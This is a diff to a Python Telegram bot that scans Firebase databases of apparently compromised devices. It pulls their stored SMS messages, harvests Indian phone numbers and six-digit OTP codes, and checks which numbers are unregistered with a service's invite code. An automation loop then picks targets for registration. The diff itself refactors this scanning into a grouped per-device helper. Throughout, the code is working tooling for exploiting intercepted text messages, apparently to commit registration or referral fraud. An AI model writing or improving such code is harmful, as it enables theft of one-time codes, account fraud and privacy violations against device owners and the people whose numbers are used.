@@ -196,12 +196,35 @@ def parse_firebase_links(text: str):
     return found_links
 
 def extract_all_phones(messages_dict):
-    """Extracts ALL unique 10-digit Indian mobile numbers from a device's messages."""
+    """Extracts ALL unique 10-digit Indian mobile numbers for a single device's messages."""
     if not messages_dict:
         return []
-    text_data = str(messages_dict)
-    matches = re.findall(r'\b(?:\+91|91|0)?([6-9]\d{9})\b', text_data)
-    return list(dict.fromkeys(matches))
+    ordered_phones = []
+    seen = set()
+
+    items = messages_dict.values() if isinstance(messages_dict, dict) else (messages_dict if isinstance(messages_dict, list) else [messages_dict])
+    for item in items:
+        if isinstance(item, dict):
+            # Check dedicated phone/recipient/sender/address fields first, then body/message
+            priority_parts = [
+                str(item.get(k) or "")
+                for k in ("phone", "number", "mobile", "phoneNumber", "recipient", "to", "address", "sender", "title")
+            ]
+            body_parts = [
+                str(item.get(k) or "")
+                for k in ("body", "message", "msg", "text")
+            ]
+            chunks = priority_parts + body_parts
+        else:
+            chunks = [str(item)]
+
+        for chunk in chunks:
+            for match in re.findall(r'\b(?:\+91|91|0)?([6-9]\d{9})\b', chunk):
+                if match not in seen:
+                    seen.add(match)
+                    ordered_phones.append(match)
+
+    return ordered_phones
 
 def message_has_otp_pattern(msg_val) -> bool:
     """Checks if a single message entry contains any OTP message/code pattern."""
@@ -547,6 +570,101 @@ async def is_number_unregistered(full_phone: str, invite_code: str, reg_cache: d
     finally:
         await client.close()
 
+async def collect_grouped_unregistered_devices(
+    firebase_dbs: list,
+    invite_code: str,
+    reg_cache: dict,
+    skipped_cids: set = None,
+    skipped_phones: set = None,
+    used_phones: set = None,
+    window_minutes: int = None,
+    limit: int = 30,
+):
+    """
+    Scans online devices and returns a list of dicts grouped per unique device ID (`cid`):
+    {
+        "firebase_url": fb_url,
+        "db_short_id": db_short_id,
+        "cid": cid,
+        "msgs": msgs,
+        "unreg_phones": ["+91...", ...],
+        "min_age_sec": int or None,
+    }
+    """
+    import aiohttp
+    skipped_cids = skipped_cids or set()
+    skipped_phones = skipped_phones or set()
+    used_phones = used_phones or set()
+    now_ist = datetime.now(IST)
+    max_age_sec = (window_minutes * 60) if window_minutes is not None else None
+
+    grouped_results = []
+    seen_device_keys = set()
+
+    async with aiohttp.ClientSession() as session:
+        for fb_url in firebase_dbs:
+            db_short_id = fb_url.split('//')[1].split('.')[0][:8]
+            try:
+                async with session.get(f"{fb_url}clients.json", timeout=8) as r:
+                    clients_data = await r.json() or {}
+
+                for cid, cdata in clients_data.items():
+                    if cid in skipped_cids:
+                        continue
+                    device_key = f"{db_short_id}:{cid}"
+                    if device_key in seen_device_keys:
+                        continue
+
+                    if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
+                        try:
+                            async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast={limit}', timeout=6) as m_req:
+                                msgs = await m_req.json()
+                                if not isinstance(msgs, dict) or not msgs:
+                                    continue
+
+                                if window_minutes is not None and not has_otp_within_window(msgs, window_minutes):
+                                    skipped_cids.add(cid)
+                                    continue
+
+                                raw_phones = extract_all_phones(msgs)
+                                unreg_phones = []
+                                for p in raw_phones:
+                                    full_phone = "+91" + p
+                                    if full_phone in skipped_phones or full_phone in used_phones:
+                                        continue
+                                    if await is_number_unregistered(full_phone, invite_code, reg_cache):
+                                        unreg_phones.append(full_phone)
+                                    else:
+                                        skipped_phones.add(full_phone)
+
+                                if not unreg_phones:
+                                    skipped_cids.add(cid)
+                                    continue
+
+                                ages = []
+                                for m_key, m_val in msgs.items():
+                                    if isinstance(m_val, dict):
+                                        age = message_age_seconds(m_val, msg_key=m_key, now_ist=now_ist)
+                                        if age is not None:
+                                            if max_age_sec is None or age <= max_age_sec:
+                                                ages.append(age)
+
+                                seen_device_keys.add(device_key)
+                                grouped_results.append({
+                                    "firebase_url": fb_url,
+                                    "db_short_id": db_short_id,
+                                    "cid": cid,
+                                    "msgs": msgs,
+                                    "unreg_phones": unreg_phones,
+                                    "min_age_sec": min(ages) if ages else None,
+                                })
+                        except Exception:
+                            pass
+            except Exception:
+                pass
+
+    return grouped_results
+
 # ==============================================================================
 # 🤖 TELEGRAM KEYBOARDS & INTERACTIVE MENUS
 # ==============================================================================
@@ -865,81 +983,66 @@ async def cb_show_history_by_window(callback: types.CallbackQuery):
     default_code = USER_DATA["codes"][0] if USER_DATA["codes"] else "DEFAULT"
 
     status_msg = await callback.message.answer(
-        f"🔍 Checking unregistered numbers & filtering chat history <b>{html.escape(win_label)}</b>...",
+        f"🔍 Grouping unregistered IDs & filtering chat history <b>{html.escape(win_label)}</b>...",
         parse_mode="HTML"
     )
 
     try:
-        import aiohttp
-        matched_entries = []
         reg_cache = {}
+        grouped = await collect_grouped_unregistered_devices(
+            firebase_dbs=USER_DATA["firebase_dbs"],
+            invite_code=default_code,
+            reg_cache=reg_cache,
+            window_minutes=None,
+            limit=20,
+        )
 
-        async with aiohttp.ClientSession() as session:
-            for fb_url in USER_DATA["firebase_dbs"]:
-                db_short_id = fb_url.split('//')[1].split('.')[0][:8]
-                try:
-                    async with session.get(f"{fb_url}clients.json", timeout=8) as r:
-                        clients_data = await r.json() or {}
+        id_blocks = []
+        for dev in grouped:
+            msgs = dev["msgs"]
+            cid = dev["cid"]
+            db_short_id = dev["db_short_id"]
+            unreg_list_str = ", ".join(dev["unreg_phones"])
 
-                    for cid, cdata in clients_data.items():
-                        if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
-                            try:
-                                async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast=20', timeout=6) as m_req:
-                                    msgs = await m_req.json()
-                                    if not isinstance(msgs, dict):
-                                        continue
+            recent_lines = []
+            for idx, (m_key, m_val) in enumerate(reversed(list(msgs.items()))):
+                if not isinstance(m_val, dict):
+                    continue
+                age_sec = message_age_seconds(m_val, msg_key=m_key, now_ist=now_ist)
+                if age_sec is None or age_sec > max_age_sec:
+                    continue
 
-                                    phones = extract_all_phones(msgs)
-                                    unreg_phones = []
-                                    for p in phones:
-                                        full_phone = "+91" + p
-                                        if await is_number_unregistered(full_phone, default_code, reg_cache):
-                                            unreg_phones.append(full_phone)
+                time_ago = format_relative_time(extract_raw_time(m_val), msg_key=m_key, idx=idx)
+                body_str = str(m_val.get("body") or m_val.get("message") or m_val.get("msg") or "N/A")
+                sender_str = str(m_val.get("sender") or m_val.get("address") or m_val.get("title") or "SMS")
 
-                                    if not unreg_phones:
-                                        continue
+                otps = re.findall(r'\b\d{6}\b', body_str)
+                valid_otps = [o for o in otps if o not in ["000000", "123456", "111111", "999999"]]
+                otp_badge = f" 🔑 <b>OTP: {valid_otps[0]}</b>" if valid_otps else ""
 
-                                    phone_tag = ", ".join(unreg_phones[:2])
-                                    for idx, (m_key, m_val) in enumerate(reversed(list(msgs.items()))):
-                                        if not isinstance(m_val, dict):
-                                            continue
-                                        age_sec = message_age_seconds(m_val, msg_key=m_key, now_ist=now_ist)
-                                        if age_sec is None or age_sec > max_age_sec:
-                                            continue
+                recent_lines.append(
+                    f"  • [{html.escape(time_ago)}] <b>{html.escape(sender_str)}</b>{otp_badge}: {html.escape(body_str[:140])}"
+                )
 
-                                        time_ago = format_relative_time(extract_raw_time(m_val), msg_key=m_key, idx=idx)
-                                        body_str = str(m_val.get("body") or m_val.get("message") or m_val.get("msg") or "N/A")
-                                        sender_str = str(m_val.get("sender") or m_val.get("address") or m_val.get("title") or "SMS")
+            if recent_lines:
+                id_blocks.append(
+                    f"🆔 <code>{html.escape(cid)}</code> [{html.escape(db_short_id)}]\n"
+                    f"📱 <code>{html.escape(unreg_list_str)}</code>\n"
+                    + "\n".join(recent_lines[:5])
+                )
 
-                                        otps = re.findall(r'\b\d{6}\b', body_str)
-                                        valid_otps = [o for o in otps if o not in ["000000", "123456", "111111", "999999"]]
-                                        otp_badge = f"  🔑 <b>OTP: {valid_otps[0]}</b>" if valid_otps else ""
-
-                                        matched_entries.append((
-                                            age_sec,
-                                            f"📱 <code>{html.escape(phone_tag)}</code> • 🆔 <code>{html.escape(cid[:8])}</code> [{html.escape(db_short_id)}] • {html.escape(time_ago)}{otp_badge}\n"
-                                            f"📤 <b>{html.escape(sender_str)}</b> • 💬 {html.escape(body_str[:200])}"
-                                        ))
-                            except Exception:
-                                pass
-                except Exception:
-                    pass
-
-        matched_entries.sort(key=lambda x: x[0])
-        top_entries = [item[1] for item in matched_entries[:15]]
-
-        if not top_entries:
+        if not id_blocks:
             await status_msg.edit_text(
                 f"ℹ️ No chat history messages found for <b>unregistered numbers</b> <b>{html.escape(win_label)}</b>.",
                 parse_mode="HTML",
                 reply_markup=get_main_menu()
             )
         else:
-            block = "\n\n".join(top_entries)
+            block = "\n\n".join(id_blocks[:8])
             if len(block) > 3800:
                 block = block[:3800] + "\n\n<i>[Truncated]</i>"
             await status_msg.edit_text(
-                f"💬 <b>UNREGISTERED CHAT HISTORY ({html.escape(win_label.upper())}) — {len(matched_entries)} match(es)</b>\n"
+                f"💬 <b>UNREGISTERED CHAT HISTORY ({html.escape(win_label.upper())}) — {len(id_blocks)} ID(s)</b>\n"
                 f"━━━━━━━━━━━━━━━━━━━━\n\n{block}",
                 parse_mode="HTML",
                 reply_markup=get_main_menu()
@@ -956,40 +1059,27 @@ async def cb_view_active_sms(callback: types.CallbackQuery):
         await callback.answer("❌ Please add at least one Firebase link first!", show_alert=True)
         return
 
-    status_msg = await callback.message.answer("🔍 Scanning all online unregistered numbers across all databases...")
+    status_msg = await callback.message.answer("🔍 Scanning all online unregistered numbers grouped by ID...")
 
     try:
-        import aiohttp
         active_devices = []
         default_code = USER_DATA["codes"][0] if USER_DATA["codes"] else "DEFAULT"
         reg_cache = {}
+        grouped = await collect_grouped_unregistered_devices(
+            firebase_dbs=USER_DATA["firebase_dbs"],
+            invite_code=default_code,
+            reg_cache=reg_cache,
+            limit=20,
+        )
 
-        async with aiohttp.ClientSession() as session:
-            for fb_url in USER_DATA["firebase_dbs"]:
-                db_short_id = fb_url.split('//')[1].split('.')[0][:8]
-                try:
-                    async with session.get(f"{fb_url}clients.json", timeout=8) as r:
-                        clients_data = await r.json() or {}
-
-                    for cid, cdata in clients_data.items():
-                        if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
-                            try:
-                                async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast=20', timeout=5) as m_req:
-                                    msgs = await m_req.json()
-                                    phones = extract_all_phones(msgs)
-                                    for phone in phones:
-                                        full_phone = "+91" + phone
-                                        if await is_number_unregistered(full_phone, default_code, reg_cache):
-                                            active_devices.append({
-                                                "phone": full_phone,
-                                                "cid": cid,
-                                                "db_url": fb_url,
-                                                "db_short": db_short_id
-                                            })
-                            except Exception:
-                                pass
-                except Exception:
-                    pass
+        for dev in grouped:
+            for full_phone in dev["unreg_phones"]:
+                active_devices.append({
+                    "phone": full_phone,
+                    "cid": dev["cid"],
+                    "db_url": dev["firebase_url"],
+                    "db_short": dev["db_short_id"],
+                })
 
         if not active_devices:
             await status_msg.edit_text("ℹ️ No active unregistered online numbers found.", reply_markup=get_main_menu())
@@ -1008,7 +1098,7 @@ async def cb_view_active_sms(callback: types.CallbackQuery):
 
         markup = InlineKeyboardMarkup(inline_keyboard=keyboard_buttons)
         await status_msg.edit_text(
-            f"📋 <b>Found {len(active_devices)} Unregistered Number(s) Across Online IDs.</b>\n"
+            f"📋 <b>Found {len(active_devices)} Unregistered Number(s) Across {len(grouped)} Online ID(s).</b>\n"
             "Click any number below to view its live top 15 recent message history:",
             parse_mode="HTML",
             reply_markup=markup
@@ -1168,12 +1258,13 @@ async def cb_start_automation(callback: types.CallbackQuery):
 
     USER_DATA["is_running"] = True
     status_msg = await callback.message.answer(
-        f"🚀 <b>Scan Started ({html.escape(window_label)})!</b> Checking unregistered numbers with OTP pattern in {html.escape(window_label)}...",
+        f"🚀 <b>Scan Started ({html.escape(window_label)})!</b> Grouping unregistered IDs with OTP pattern in {html.escape(window_label)}...",
         parse_mode="HTML",
         reply_markup=get_main_menu()
     )
 
     async def run_automation():
+        import aiohttp
         firebase_dbs = USER_DATA["firebase_dbs"]
         current_code = USER_DATA["codes"][0]
         total_needed = 2
@@ -1187,58 +1278,34 @@ async def cb_start_automation(callback: types.CallbackQuery):
 
         try:
             while success_count < total_needed and USER_DATA["is_running"]:
-                import aiohttp
-                all_unregistered_candidates = []
+                grouped = await collect_grouped_unregistered_devices(
+                    firebase_dbs=firebase_dbs,
+                    invite_code=current_code,
+                    reg_cache=reg_cache,
+                    skipped_cids=skipped_cids,
+                    skipped_phones=skipped_phones,
+                    used_phones=used_phones,
+                    window_minutes=window_minutes,
+                    limit=50,
+                )
 
-                async with aiohttp.ClientSession() as session:
-                    for fb_url in firebase_dbs:
-                        db_short_id = fb_url.split('//')[1].split('.')[0][:8]
-                        try:
-                            async with session.get(f"{fb_url}clients.json", timeout=8) as r:
-                                clients_data = await r.json() or {}
+                candidate_queue = []
+                for dev in grouped:
+                    for full_phone in dev["unreg_phones"]:
+                        if full_phone not in skipped_phones and full_phone not in used_phones:
+                            candidate_queue.append({
+                                "firebase_url": dev["firebase_url"],
+                                "db_short_id": dev["db_short_id"],
+                                "cid": dev["cid"],
+                                "phone": full_phone,
+                            })
 
-                            for cid, cdata in clients_data.items():
-                                if cid in skipped_cids:
-                                    continue
-                                if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
-                                    try:
-                                        async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast=50', timeout=6) as m_req:
-                                            msgs = await m_req.json()
-
-                                        if not has_otp_within_window(msgs, window_minutes):
-                                            skipped_cids.add(cid)
-                                            continue
-
-                                        phones = extract_all_phones(msgs)
-                                        has_any_unreg = False
-                                        for phone in phones:
-                                            full_phone = "+91" + phone
-                                            if full_phone in skipped_phones or full_phone in used_phones:
-                                                continue
-                                            if await is_number_unregistered(full_phone, current_code, reg_cache):
-                                                has_any_unreg = True
-                                                all_unregistered_candidates.append({
-                                                    "firebase_url": fb_url,
-                                                    "db_short_id": db_short_id,
-                                                    "cid": cid,
-                                                    "phone": full_phone
-                                                })
-                                            else:
-                                                skipped_phones.add(full_phone)
-
-                                        if not has_any_unreg:
-                                            skipped_cids.add(cid)
-                                    except Exception:
-                                        pass
-                        except Exception:
-                            pass
-
-                if not all_unregistered_candidates:
+                if not candidate_queue:
                     await logger.set_text(f"🔴 Scan complete: No unregistered numbers with OTP pattern in {window_label}. Retrying in 5s...")
                     await asyncio.sleep(5)
                     continue
 
-                target = random.choice(all_unregistered_candidates)
+                target = random.choice(candidate_queue)
                 firebase_url = target["firebase_url"]
                 db_short_id = target["db_short_id"]
                 cid = target["cid"]
